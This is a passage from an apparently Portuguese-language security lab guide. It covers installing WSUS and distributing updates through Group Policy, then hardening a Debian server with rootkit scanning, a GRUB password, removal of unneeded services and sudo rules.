<p>Em <em>Select Update Source</em>, mantenha a caixa <em>Store updates locally</em> marcada, com o valor <code>K:\WSUS</code>, como se segue. Clique em <em>Next</em>.</p>
<div id="img-wsus4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus4.png" alt="wsus4">
</div>
<div class="title">Figure 127. Pasta de download dos arquivos de update do WSUS</div>
</div>
</li>
<li>
<p>Na tela <em>Database Options</em>, mantenha marcada a caixa <em>Install Windows Internal Database on this computer</em> com o valor <code>K:\WSUS</code>, e clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>Web Site Selection</em>, mantenha marcada a caixa <em>Use the existing IIS Default Web site (recommended)</em> e clique em <em>Next</em>.</p>
</li>
<li>
<p>Na tela <em>Ready to Install Windows Server Update Services 3.0 SP2</em>, verifique as opções de instalação como mostrado a seguir. Se tudo estiver correto, clique em <em>Next</em>.</p>
<div id="img-wsus5" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus5.png" alt="wsus5">
</div>
<div class="title">Figure 128. Revisão das opções de instalação do WSUS</div>
</div>
<div class="paragraph">
<p>Aguarde o processo de instalação do WSUS. Ao final, clique em <em>Finish</em>.</p>
</div>
</li>
<li>
<p>Após a instalação será aberto o <em>Windows Server Update Services Configuration Wizard</em>, como mostrado abaixo. Clique em <em>Next</em>.</p>
<div id="img-wsus6" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus6.png" alt="wsus6">
</div>
<div class="title">Figure 129. Configuração do WSUS</div>
</div>
</li>
<li>
<p>Na tela <em>Join the Microsoft Update Improvement Program</em>, desmarque a caixa <em>Yes, I would like to join the Microsoft Update Improvement Program</em> e clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>Choose Upstream Server</em>, mantenha marcada a caixa <em>Synchronize from Microsoft Update</em> e clique em <em>Next</em>.</p>
</li>
<li>
<p>Na tela <em>Specify Proxy Server</em>, apenas clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>Connect to Upstream Server</em>, clique no botão <em>Start Connecting</em>. O configurar irá conectar-se à Microsoft para fazer o download de tipos de atualizações disponíveis, produtos que podem ser atualizados e linguagens disponíveis. Esse processo pode demorar alguns minutos.</p>
<div id="img-wsus7" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus7.png" alt="wsus7">
</div>
<div class="title">Figure 130. Atualização da base de updates do WSUS</div>
</div>
<div class="paragraph">
<p>Ao final do procedimento, clique em <em>Next</em>.</p>
</div>
</li>
<li>
<p>Iremos fazer o download de atualizações para a máquina <em>WinServer-G</em> (Windows Server 2008 x86, idioma Inglês-EUA) e <em>WinClient-G</em> (Windows 7 x64, idioma Português-Brasil). Assim, na tela <em>Choose languages</em>, marque a caixa <em>Download updates only in these languages</em> e marque os idiomas <em>English</em> e <em>Portuguese (Brazil)</em>. Clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>Choose Products</em>, desmarque todas as atualizações do Office e do Windows. Pontualmente, marque apenas as caixas <em>Windows</em> &gt; <em>Windows 7</em> e <em>Windows</em> &gt; <em>Windows Server 2008</em>, como mostrado a seguir. Clique em <em>Next</em>.</p>
<div id="img-wsus8" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus8.png" alt="wsus8">
</div>
<div class="title">Figure 131. Escolha de produtos para download de atualizações</div>
</div>
</li>
<li>
<p>Na tela <em>Choose Classifications</em>, marque as caixas <em>Critical Updates</em>, <em>Definition Updates</em>, <em>Security Updates</em> e <em>Service Packs</em>. Clique em <em>Next</em>.</p>
</li>
<li>
<p>Em <em>Set Sync Schedule</em> é possível agendar a atualização periódica e automática da base de atualizações a partir do site da Microsoft. Já que neste laboratório estamos configurando apenas um ambiente de testes, mantenha a caixa <em>Synchronize manually</em> marcada e clique em <em>Next</em>.</p>
</li>
<li>
<p>Na tela <em>Finished</em>, desmarque a caixa <em>Launch the Windows Server Update Services Administration Console</em> e mantenha marcada a caixa <em>Begin initial synchronization</em>. Clique em <em>Finish</em>.</p>
</li>
<li>
<p>Para visualizar os relatórios do WSUS, faça o download do <em>Microsoft Report Viewer 2008 Redistributable</em> em <a href="https://www.microsoft.com/en-us/download/details.aspx?id=6576" class="bare">https://www.microsoft.com/en-us/download/details.aspx?id=6576</a> , e instale-o. Aceite todas as opções padrão do instalador.</p>
</li>
<li>
<p>Abra a console de configuração do <em>Windows Server Update Services</em>&#8201;&#8212;&#8201;abra o menu <em>Start</em> e pesquise pelo termo <code>update</code> para encontrar o programa. Você deverá ver a tela abaixo:</p>
<div id="img-wsus9" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus9.png" alt="wsus9">
</div>
<div class="title">Figure 132. Console administrativa do WSUS</div>
</div>
<div class="paragraph">
<p>Para verificar o estado da sincronização iniciada no passo (22), navegue para <em>WINSERVER-G</em> &gt; <em>Synchronizations</em>. Ao final da sincronização você deverá ver o processo concluído com sucesso, como se segue:</p>
</div>
<div id="img-wsus10" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus10.png" alt="wsus10">
</div>
<div class="title">Figure 133. Sincronização do WSUS realizada com sucesso</div>
</div>
<div class="paragraph">
<p>Finalmente, feche a console de configuração do <em>Windows Server Update Services</em>.</p>
</div>
</li>
<li>
<p>Antes de utilizar plenamento o WSUS, é necessário atualizar novamente sua máquina <em>WinServer-G</em> usando o <em>Windows Update</em>. A atualização KB2720211 (<a href="https://support.microsoft.com/en-us/help/2720211/" class="bare">https://support.microsoft.com/en-us/help/2720211/</a>), de 8/6/2011, é necessária para atualização dos canais de comunicação do WSUS com os clientes de atualização.</p>
<div class="paragraph">
<p>Ao final da atualização, reinicie a máquina <em>WinServer-G</em> para concluir o processo.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_7_configuração_de_clientes_no_wsus">7) Configuração de clientes no WSUS</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>WinServer-G</em> e <em>WinClient-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Vamos criar uma política para atualização automática de clientes a partir de nosso servidor WSUS. Execute <em>Start</em> &gt; <em>Run&#8230;&#8203;</em> &gt; <code>gpmc.msc</code>. Você deverá ver a tela do <em>Group Policy Management</em>, como na atividade (5).</p>
<div class="paragraph">
<p>Expanda a floresta <code>domainA.esr.local</code>, e em seguida <em>Domains</em>. Clique com o botão direito no domínio <code>domainA.esr.local</code>, e em seguida em <em>Create a GPO in this domain, and Link it here&#8230;&#8203;</em>. Para o nome da GPO, digite <em>wsus</em>, e em seguida clique em <em>OK</em>. Uma nova política deve surgir na lista do painel direito, como mostrado abaixo:</p>
</div>
<div id="img-wsus-gpo1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo1.png" alt="wsus gpo1">
</div>
<div class="title">Figure 134. Criação de política para o WSUS</div>
</div>
</li>
<li>
<p>Clique com o botão direito sobre a política <em>wsus</em>, e em seguida em <em>Edit</em>. Navegue para <em>Computer Configuration</em> &gt; <em>Policies</em> &gt; <em>Administrative Templates</em> &gt; <em>Windows Components</em> &gt; <em>Windows Update</em>. Em seguida, clique duas vezes sobre a diretiva de configuração <em>Configure Automatic Updates</em>.</p>
<div class="paragraph">
<p>Marque a caixa <em>Enabled</em>, e em seguida escolha:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Configure automatic updating</em>: <em>3 - Auto download and notify for install</em></p>
</li>
<li>
<p><em>Scheduled install day</em>: <em>0 - Every day</em></p>
</li>
<li>
<p><em>Scheduled install time</em>: <em>03:00</em></p>
</li>
</ul>
</div>
</div>
</div>
<div id="img-wsus-gpo2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo2.png" alt="wsus gpo2">
</div>
<div class="title">Figure 135. Configuração de atualizações automáticas via GPO</div>
</div>
<div class="paragraph">
<p>Clique em <em>OK</em>.</p>
</div>
</li>
<li>
<p>De volta à tela de edição de GPOs, clique duas vezes sobre a diretiva de configuração <em>Specify intranet Microsoft update service location</em>.</p>
<div class="paragraph">
<p>Marque a caixa <em>Enabled</em>, e em seguida escolha:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Set the intranet update service for detecting updates</em>: <code><a href="http://172.16.1.20" class="bare">http://172.16.1.20</a></code></p>
</li>
<li>
<p><em>Set the intranet statistics server</em>: <code><a href="http://172.16.1.20" class="bare">http://172.16.1.20</a></code></p>
</li>
</ul>
</div>
</div>
</div>
<div id="img-wsus-gpo3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo3.png" alt="wsus gpo3">
</div>
<div class="title">Figure 136. Configuração de servidor remoto para download de atualizações</div>
</div>
<div class="paragraph">
<p>Clique em <em>OK</em>.</p>
</div>
</li>
<li>
<p>Feche as janelas de configuração das GPOs. Como anteriormente, sabemos que as GPOs são atualizadas de 90 em 90 minutos, com <em>offsets</em> aleatórios de 30 minutos&#8201;&#8212;&#8201;para não aguardar esse intervalos, acesse a máquina <em>WinClient-G</em>, abra uma janela do <em>prompt</em> de comando e digite <code>gpupdate /force</code> para atualizar as GPOs imediatamente. Para iniciar o contato imediato da máquina com o servidor WSUS, digite <code>wuauclt.exe /detectnow</code>.</p>
<div class="paragraph">
<p>Feito isso, abra o <em>Windows Update</em> e verifique se há novas atualizações para a máquina <em>WinClient-G</em>:</p>
</div>
<div id="img-wsus-gpo4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo4.png" alt="wsus gpo4">
</div>
<div class="title">Figure 137. WinClient-G verificando se existem novas atualizações</div>
</div>
<div class="paragraph">
<p>Ao final do processo, a máquina irá reportar-se como atualizada. Isso é parcialmente verdade, como veremos a seguir.</p>
</div>
</li>
<li>
<p>De volta à máquina <em>WinServer-G</em>, abra a console de configuração do <em>Windows Server Update Services</em> e navegue para <em>WINSERVER-G</em> &gt; <em>Computers</em> &gt; <em>All Computers</em>. O estado de atualização da máquina <em>WinClient-A</em> será mostrado num gráfico no centro da tela, como na imagem a seguir:</p>
<div id="img-wsus-gpo5" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo5.png" alt="wsus gpo5">
</div>
<div class="title">Figure 138. Status de atualização da máquina WinClient-G</div>
</div>
<div class="paragraph">
<p>Observe que a máquina <em>WinClient-G</em> possui 2369 atualizações realizadas e 273 ainda não aplicadas, e com o <em>service pack</em> 1 instalado. No WSUS, a gestão de atualizações é feita de forma centralizada pelo administrador&#8201;&#8212;&#8201;pode-se agrupar máquinas em grupos de trabalho, e habilitar/desabilitar atualizações pontualmente para essas máquinas e grupos. Para gerenciar a aprovação de atualizações, navegue para <em>WINSERVER-A</em> &gt; <em>Updates</em> &gt; <em>All Updates</em>. Ajuste o filtro para condição <em>Unapproved</em> e estado <em>Failed or Needed</em>, e clique em <em>Refresh</em>. Você deverá ver algo semelhante a tela a seguir:</p>
</div>
<div id="img-wsus-gpo6" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo6.png" alt="wsus gpo6">
</div>
<div class="title">Figure 139. Aprovação de atualizações no WSUS, parte 1</div>
</div>
<div class="paragraph">
<p>Aprove todas as atualizações. Selecione-as usando SHIFT e no painel direito, clique em <em>Actions</em> &gt; <em>Update</em> &gt; <em>Approve&#8230;&#8203;</em>. Na nova janela, clique no quadrado à esquerda de <em>All Computers</em> e marque <em>Approved for Install</em>; faça o mesmo para o grupo abaixo, <em>Unassigned Computers</em>, e clique em <em>OK</em>. O WSUS iniciará o processo de aprovação das atualizações, como mostrado abaixo:</p>
</div>
<div id="img-wsus-gpo7" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo7.png" alt="wsus gpo7">
</div>
<div class="title">Figure 140. Aprovação de atualizações no WSUS, parte 2</div>
</div>
<div class="paragraph">
<p>Ao final do processo, clique em <em>Close</em>.</p>
</div>
</li>
<li>
<p>De volta à máquina <em>WinClient-G</em>, verifique novamente por atualizações usando o <em>Windows Update</em>. Normalmente, não seria necessário realizar este passo&#8201;&#8212;&#8201;já configuramos o download e notificação automática de atualizações no passo (2) desta atividade. Mas, para não termos que esperar até 3 da manhã, vamos acelerar o processo. Após a verificação, note que novas atualizações surgem como disponíveis na interface:</p>
<div id="img-wsus-gpo8" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/wsus-gpo8.png" alt="wsus gpo8">
</div>
<div class="title">Figure 141. Novas atualizações aprovadas pelo WSUS disponibilizadas</div>
</div>
<div class="paragraph">
<p>Um vez aprovadas na console administrativa do WSUS, as atualizações podem ser instaladas nas máquinas cliente. Assim, o administrador pode controlar de forma granular quais atualizações distribuir, para quais máquinas, e quando deseja que elas sejam instaladas, tornando o processo de gestão de segurança do parque computacional muito mais eficiente.</p>
</div>
</li>
</ol>
</div>
<div style="page-break-after: always;"></div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_sessão_10_configuração_segura_de_servidores_linux">Sessão 10: Configuração segura de servidores Linux</h2>
<div class="sectionbody">
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>As atividades desta sessão serão realizadas na máquina virtual <em>LinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Nesta seção iremos fazer uma série de configurações de segurança básica em um servidor Linux, especificamente a máquina <em>LinServer-G</em>. O estabelecimento de um <em>baseline</em> de segurança, como o que faremos aqui, é um passo importante na definição de uma fundação segura para a implantação de diferentes serviços de rede e, no caso da virtualização, de <em>templates</em> de máquinas virtuais.</p>
</div>
<div class="sect2">
<h3 id="_1_análise_de_rootkits">1) Análise de <strong><em>rootkits</em></strong></h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>As ferramentas <code>chkrootkit</code> e <code>rkhunter</code> podem ser utilizadas para buscar por <em>rootkits</em> em um sistema Linux. <em>Rootkits</em>, como vimos na teoria, são conjuntos de programas de computador desenhados para permitir acesso continuado a área não-autorizadas de um sistema, usualmente com permissões elevadas.</p>
<div class="paragraph">
<p>Instale os pacotes <code>chkrootkit</code> e <code>rkhunter</code> na máquina <em>LinServer-G</em>, e verifique se existem <em>rootkits</em> instalados.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get install chkrootkit rkhunter</pre>
</div>
</div>
<div class="paragraph">
<p>Execute o <code>chkrootkit</code>, e verifique seus resultados:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># chkrootkit

(...)</pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, vamos rodar o <code>rkhunter</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># rkhunter -c

(...)

System checks summary
=====================

File properties checks...
    Files checked: 143
    Suspect files: 0

Rootkit checks...
    Rootkits checked : 378
    Possible rootkits: 0

Applications checks...
    All checks skipped

The system checks took: 30 seconds

All results have been written to the log file: /var/log/rkhunter.log

One or more warnings have been found while checking the system.
Please check the log file (/var/log/rkhunter.log)</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_inserção_de_senha_no_bootloader">2) Inserção de senha no <strong><em>bootloader</em></strong></h3>
<div class="paragraph">
<p>O cuidado com a segurança física das máquinas deve ser amplo, indo desde o acesso à sala dos servidores até a adição de senha na BIOS dos sistemas (impedindo, por exemplo, alteração do dispositivo de <em>boot</em>).</p>
</div>
<div class="paragraph">
<p>Um aspecto que não pode ser esquecido é o <em>bootloader</em>, que faz a carga inicial do kernel&#8201;&#8212;&#8201;se desprotegido, um atacante com acesso físico à máquina pode utilizá-lo para alterar a senha do usuário <code>root</code> e ter acesso irrestrito ao sistema, dentre outras possibilidades.</p>
</div>
<div class="paragraph">
<p>O <em>bootloader</em> em uso pela grande maioria das distribuições Linux atualmente é o GRUB (<em>GRand Unified Bootloader</em>), e o Debian não é exceção. Vamos configurar uma senha de acesso ao GRUB para impedir que um atacante consiga ter acesso indevido ao sistema.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Usando o comando <code>grub-mkpasswd-pbkdf2</code>, gere um hash para a senha <code>rnpesr123</code>.</p>
<div class="literalblock">
<div class="content">
<pre># echo -e 'rnpesr123\nrnpesr123' | grub-mkpasswd-pbkdf2 | awk '/grub.pbkdf/{print$NF}'
grub.pbkdf2.sha512.10000.D8258FF5554EB31945F1AB64026CFE276601804B0CFA82F14B0F61F9A9025ACA07C99BFF82F41912AAD897BA0DA9F0EB286FEB6E61332AEF2AB844952923FCB1.4CAC30EFD8FBC8070D52C52C5CA5A9C54A090881755EF9AE5A6B7077399B0641DE2E3B966A909F5F3A87A7FE0889492BF13FA2C017CDF54AB0025FB4BD92613E</pre>
</div>
</div>
</li>
<li>
<p>Edite o arquivo <code>/etc/grub.d/40_custom</code> e insira o superusuário <code>admin</code>, com senha idêntica ao hash gerado no passo anterior.</p>
<div class="literalblock">
<div class="content">
<pre># echo 'set superusers="admin"' &gt;&gt; /etc/grub.d/40_custom</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ghash="$( echo -e 'rnpesr123\nrnpesr123' | grub-mkpasswd-pbkdf2 | awk '/grub.pbkdf/{print$NF}' )" ; echo "password_pbkdf2 admin ${ghash}" &gt;&gt; /etc/grub.d/40_custom ; unset ghash</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># tail -n2 /etc/grub.d/40_custom
set superusers="admin"
password_pbkdf2 admin grub.pbkdf2.sha512.10000.5196BE6001F91BB595600DC25D37F5F1448266CEF199431D9B80DA7ADF255685A43CCDE19C06DD132066DF945885D479A55E0A3BB8CFF6457B199606977BE85D.2E60E091884965BF4BD86C736D95F3B3490BA906CF8E725F81D1FC3BD35A29B5799DDB6ED03CA661C3483974A57429E5DA6B253F9E3FA124A47B21ED1015C659</pre>
</div>
</div>
</li>
<li>
<p>Reconfigure o GRUB com a nova combinação usuário/senha e reinicie a máquina. Verifique o funcionamento da sua configuração.</p>
<div class="literalblock">
<div class="content">
<pre># grub-mkconfig -o /boot/grub/grub.cfg
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-3.16.0-6-amd64
Found initrd image: /boot/initrd.img-3.16.0-6-amd64
Found linux image: /boot/vmlinuz-3.16.0-4-amd64
Found initrd image: /boot/initrd.img-3.16.0-4-amd64
done</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># reboot</pre>
</div>
</div>
<div class="paragraph">
<p>Após o <em>boot</em> da máquina, o menu do GRUB nos apresenta a possibilidade de editar a configuração apertando a tecla <code>e</code>:</p>
</div>
<div id="img-grub-passwd1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/grub-passwd1.png" alt="grub passwd1">
</div>
<div class="title">Figure 142. Edição de opções no GRUB</div>
</div>
<div class="paragraph">
<p>Apertando <code>e</code> sobre a primeira opção, imediatamente o sistema requisita a combinação usuário/senha configurada anteriormente:</p>
</div>
<div id="img-grub-passwd2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/grub-passwd2.png" alt="grub passwd2">
</div>
<div class="title">Figure 143. Inserção de usuário/senha no GRUB</div>
</div>
<div class="paragraph">
<p>Mediante a inserção da combinação correta, o menu de edição de opções de <em>boot</em> é mostrado, como se segue.</p>
</div>
<div id="img-grub-passwd3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/grub-passwd3.png" alt="grub passwd3">
</div>
<div class="title">Figure 144. Edição de opções de boot no GRUB</div>
</div>
<div class="paragraph">
<p>Note, ainda, que mesmo o <em>boot</em> do sistema prossegue apenas se a combinação de usuário/senha correta é inserida no GRUB.</p>
</div>
</li>
<li>
<p>Edite a configuração do GRUB para que ele solicite senha <strong>apenas</strong> em caso de edição de entradas do menu, e que o <em>boot</em> normal do sistema prossiga sem que haja necessidade de interação.</p>
<div class="paragraph">
<p>Para conseguir o efeito desejado, é necessário editar o arquivo <code>/etc/grub.d/10_linux</code>. Na função <code>linux_entry()</code>, edite as duas linhas <code>echo "menuentry (&#8230;&#8203;)</code>, inserindo a flag <code>--unrestricted</code> antes da variável <code>${CLASS}</code>.</p>
</div>
<div class="paragraph">
<p>Vamos ver um antes/depois para ficar mais claro. Veja como estão as linhas 132-134 do arquivo <code>/etc/grub.d/10_linux</code> antes da edição:</p>
</div>
<div class="listingblock">
<div class="title">Listing 1. /etc/grub.d/10_linux</div>
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">132       echo "menuentry '$(echo "$title" | grub_quote)' ${CLASS} \$menuentry_id_option 'gnulinux-$version-$type-$boot_device_id' {" | sed "s/^/$submenu_indentation/"
133   else
134       echo "menuentry '$(echo "$os" | grub_quote)' ${CLASS} \$menuentry_id_option 'gnulinux-simple-$boot_device_id' {" | sed "s/^/$submenu_indentation/"</code></pre>
</div>
</div>
<div class="paragraph">
<p>Após a edição, elas devem ficar assim:</p>
</div>
<div class="listingblock">
<div class="title">Listing 2. /etc/grub.d/10_linux</div>
<div class="content">
<pre class="highlight"><code class="language-bash" data-lang="bash">132       echo "menuentry '$(echo "$title" | grub_quote)' --unrestricted ${CLASS} \$menuentry_id_option 'gnulinux-$version-$type-$boot_device_id' {" | sed "s/^/$submenu_indentation/"
133   else
134       echo "menuentry '$(echo "$os" | grub_quote)' --unrestricted ${CLASS} \$menuentry_id_option 'gnulinux-simple-$boot_device_id' {" | sed "s/^/$submenu_indentation/"</code></pre>
</div>
</div>
<div class="paragraph">
<p>Note a adição da <code>flag</code> <code>--unrestricted</code> antes de <code>${CLASS}</code> nas linhas 132 e 134.</p>
</div>
<div class="paragraph">
<p>Refaça a configuração do GRUB, reinicie a máquina e teste o funcionamento.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># grub-mkconfig -o /boot/grub/grub.cfg
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-3.16.0-6-amd64
Found initrd image: /boot/initrd.img-3.16.0-6-amd64
Found linux image: /boot/vmlinuz-3.16.0-4-amd64
Found initrd image: /boot/initrd.img-3.16.0-4-amd64
done</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># reboot</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_remoção_de_serviços_desnecessários">3) Remoção de serviços desnecessários</h3>
<div class="paragraph">
<p>A remoção de serviços que não estão sendo utilizados em um servidor é premissa básica de segurança, pois reduz a superfície de ataque disponível para um agente malicioso. Deve-se fazer esse trabalho de forma diligente e constante, de forma a manter apenas aqueles serviços absolutamente necessários em operação.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Descubra quais serviços estão escutando por conexões TCP na máquina <em>LinServer-G</em>. Em seguida, faça o mesmo para o protocolo UDP.</p>
<div class="paragraph">
<p>Primeiro, vamos verificar os serviços TCP:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ss -tnlp
State      Recv-Q Send-Q        Local Address:Port                       Peer Address:Port
LISTEN     0      80                127.0.0.1:3306                                  *:*
users:(("mysqld",pid=540,fd=17))
LISTEN     0      128                       *:22                                    *:*
users:(("sshd",pid=457,fd=3))
LISTEN     0      20                127.0.0.1:25                                    *:*
users:(("exim4",pid=853,fd=3))
LISTEN     0      128                      :::80                                   :::*
users:(("apache2",pid=586,fd=4),("apache2",pid=585,fd=4),("apache2",pid=584,fd=4),("apache2",pid=583,fd=4),("apache2",pid=582,fd=4),("apache2",pid=550,fd=4))
LISTEN     0      128                      :::22                                   :::*
users:(("sshd",pid=457,fd=4))
LISTEN     0      20                      ::1:25                                   :::*
users:(("exim4",pid=853,fd=4))</pre>
</div>
</div>
<div class="paragraph">
<p>Depois, UDP:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># ss -unlp
State      Recv-Q Send-Q        Local Address:Port                       Peer Address:Port
UNCONN     0      0                         *:514                                   *:*
users:(("syslog-ng",pid=320,fd=12))
UNCONN     0      0               172.16.1.10:123                                   *:*
users:(("ntpd",pid=546,fd=19))
UNCONN     0      0                 127.0.0.1:123                                   *:*
users:(("ntpd",pid=546,fd=18))
UNCONN     0      0                         *:123                                   *:*
users:(("ntpd",pid=546,fd=17))
UNCONN     0      0      fe80::a00:27ff:fe15:71d%enp0s3:123                                  :::*
          users:(("ntpd",pid=546,fd=21))
UNCONN     0      0                       ::1:123                                  :::*
users:(("ntpd",pid=546,fd=20))
UNCONN     0      0                        :::123                                  :::*
users:(("ntpd",pid=546,fd=16))</pre>
</div>
</div>
</li>
<li>
<p>Usando o comando <code>lsof</code>, descubra mais detalhes sobre o processo escutando na porta 25/TCP.</p>
<div class="literalblock">
<div class="content">
<pre># lsof -i tcp:25 -n
COMMAND  PID        USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
exim4   1316 Debian-exim    4u  IPv4  11627      0t0  TCP 127.0.0.1:smtp (LISTEN)
exim4   1316 Debian-exim    5u  IPv6  11628      0t0  TCP [::1]:smtp (LISTEN)</pre>
</div>
</div>
</li>
<li>
<p>Descubra o nome do pacote escutando na porta 25/TCP. Em seguida, remova-o juntamente com seus arquivos de configuração.</p>
<div class="literalblock">
<div class="content">
<pre># dpkg -l | grep exim
ii  exim4-base                         4.89-2+deb9u3                  amd64        support files for all Exim MTA (v4) packages
ii  exim4-config                       4.89-2+deb9u3                  all          configuration for the Exim MTA (v4)
ii  exim4-daemon-light                 4.89-2+deb9u3                  amd64        lightweight Exim MTA (v4) daemon</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get purge exim4*</pre>
</div>
</div>
</li>
<li>
<p>Verifique que a porta 25/TCP não está mais na lista de <em>sockets</em> em estado LISTEN.</p>
<div class="literalblock">
<div class="content">
<pre># ss -tnlp | grep ':25 '</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_controle_granular_de_acesso_a_comandos">4) Controle granular de acesso a comandos</h3>
<div class="paragraph">
<p>O <code>sudo</code> é uma importante ferramenta no controle de permissionamento em sistemas Linux. Ele permite que um usuário execute comandos como outro usuário do sistema, mas apenas aqueles previamente autorizados pelo usuário <code>root</code>. Dessa forma, pode-se permitir controle parcial do sistema a um colaborador, sem que ele tenha que ter acesso irrestrito à conta de superusuário.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Instale o pacote <code>sudo</code>, e verifique sua configuração padrão.</p>
<div class="literalblock">
<div class="content">
<pre># apt-get install sudo</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># visudo</pre>
</div>
</div>
</li>
<li>
<p>Adicione o usuário <code>aluno</code> ao grupo <code>sudo</code>, e verifique quais comandos ele pode utilizar a partir de então. Adicionalmente, faça com que não seja necessário digitar senha para executar comandos privilegiados.</p>
<div class="literalblock">
<div class="content">
<pre># adduser aluno sudo
Adding user `aluno' to group `sudo' ...
Adding user aluno to group sudo
Done.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># su - aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for aluno:
Matching Defaults entries for aluno on LinServer-A:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin


User aluno may run the following commands on LinServer-A:
    (ALL : ALL) ALL</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ sudo visudo
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ sudo cat /etc/sudoers | grep authenticate
Defaults        !authenticate</pre>
</div>
</div>
</li>
<li>
<p>Suponha que um novo colaborador, <code>mcfly</code>, acaba de entrar em seu setor e ficou responsável pela edição das regras de firewall dos servidores.</p>
<div class="openblock">
<div class="content">
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Crie um novo usuário para esse colaborador, e configure sua senha como <code>rnpesr</code>.</p>
</li>
<li>
<p>Edite as regras de <code>sudo</code> para que ele possa editar as regras de firewall da máquina <em>LinServer-G</em> como o usuário <code>root</code>, e apenas isso.</p>
</li>
<li>
<p>Teste sua configuração.</p>
</li>
</ol>
</div>
</div>
</div>
<div class="paragraph">
<p>Vamos primeiramente adicionar o usuário e configurar sua senha.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># useradd -m -s /bin/bash mcfly</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># echo 'mcfly:rnpesr' | chpasswd</pre>
</div>
</div>
<div class="paragraph">
<p>Em seguida, vamos editar o arquivo <code>/etc/sudoers</code> (para mais detalhes sobre sua sintaxe, consulte <code>man 5 sudoers</code>) e dar permissão para o usuário <code>mcfly</code> executar o comando <code>/sbin/iptables</code>.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># visudo
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># grep '^mcfly ' /etc/sudoers
mcfly   ALL=(root) /sbin/iptables</pre>
</div>
</div>
<div class="paragraph">
<p>Finalmente, vamos testar a configuração.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># su - mcfly</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
mcfly</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ sudo iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

